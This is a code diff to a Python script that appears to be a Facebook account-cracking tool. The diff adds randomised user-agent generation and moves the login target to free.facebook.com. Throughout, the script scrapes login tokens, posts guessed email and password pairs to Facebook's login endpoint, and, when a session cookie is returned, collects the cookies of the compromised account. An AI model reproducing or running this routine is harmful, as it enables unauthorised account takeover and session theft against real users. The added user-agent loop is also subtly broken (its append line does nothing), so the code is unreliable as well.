@@ -90,6 +90,7 @@ bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "0
 done = False
 ugen=[]
 uas=[]
+ugen2=[]
 usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
 rr = random.randint
 for xd in range(3005):
@@ -123,6 +124,22 @@ def jalan(z):
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.01)
+
+for x in range(10000):
+	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
+	b=random.choice(['4','5','6','7','8','9','10','11','12'])
+	c='ASUS_I006D Build/RKQ1.201022.002'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36 Sleipnir/3.5.28'
+	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	'useragent.append',(uakua)
 
 for x in range(10000):
 	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
@@ -298,7 +315,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -309,9 +326,9 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
+            header_freefb = {'authority': 'free.facebook.com',
             'method': 'GET', 
-	        'scheme': 'https', 
+            'scheme': 'https', 
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -328,9 +345,9 @@ def b(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro,
+            'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
             'viewport-width': '980',}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
